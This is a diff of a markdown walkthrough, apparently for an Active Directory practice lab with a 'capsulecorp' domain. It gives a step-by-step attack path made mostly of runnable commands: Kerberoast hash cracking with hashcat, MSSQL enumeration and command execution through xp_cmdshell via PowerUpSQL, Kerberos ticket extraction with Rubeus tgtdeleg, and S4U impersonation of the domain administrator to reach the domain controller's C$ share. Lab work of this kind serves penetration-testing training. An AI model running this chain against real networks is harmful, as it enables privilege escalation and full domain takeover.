@@ -70,18 +70,25 @@ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 
 # 2. Constrained delegation
 
-1. The user `capsulecorp\vuln_svc` has access 
+1. The user `capsulecorp\vuln_svc` has access to a MSSQL instance. To check so, import `PowerUpSQL` and execute the following command.
+
+```powershell
+Import-Module C:\Tools\PowerUpSQL.ps1
+Get-SQLInstanceDomain
+```
 
 2. Obtain code execution on the machine through MSSQL
 
 ```powershell
 Import-Module C:\Tools\PowerUpSQL.ps1
-Get-SQLQuery -Instance "172.28.43.201,1433" -Query "select @@servername"
-Get-SQLQuery -Instance "172.28.43.201,1433" -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
-Get-SQLQuery -Instance "172.28.43.201,1433" -Query "EXEC master.dbo.xp_cmdshell 'whoami';"
+Get-SQLQuery -Instance "gohan.capsulecorp.local,1433" -Query "select @@servername"
+Get-SQLQuery -Instance "gohan.capsulecorp.local,1433" -Query "EXEC master.dbo.xp_cmdshell 'whoami';"
+
+# Enabling xp_cmdshell it is not necessary because it is already by default
+# Get-SQLQuery -Instance "gohan.capsulecorp.local,1433" -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 ```
 
-3. Once you have a proper reverse shell, extract the KRBTGT SQL_SVC ticket.
+3. Once you have a proper reverse shell, extract the KRBTGT SQL_SVC ticket using Rubeus. To do so, you will have to upload/download the file into the machine.
 
 ```powershell
 .\Rubeus.exe  tgtdeleg /nowrap
@@ -90,7 +97,7 @@ Get-SQLQuery -Instance "172.28.43.201,1433" -Query "EXEC master.dbo.xp_cmdshell 
 3. Impersonate the user
 
 ```powershell
- .\Rubeus.exe s4u  /impersonateuser:administrator /domain:capsulecorp.local /msdsspn:cifs/goku.capsulecorp.local /dc:goku.capsulecorp.local  /nowrap /ptt /ticket:<DUMPED_TICKET>
+.\Rubeus.exe s4u  /impersonateuser:administrator /domain:capsulecorp.local /msdsspn:cifs/goku.capsulecorp.local /dc:goku.capsulecorp.local  /nowrap /ptt /ticket:<DUMPED_TICKET>
 ```
 
 4. Check that you have access to  the sahre `GOKU$\C$`
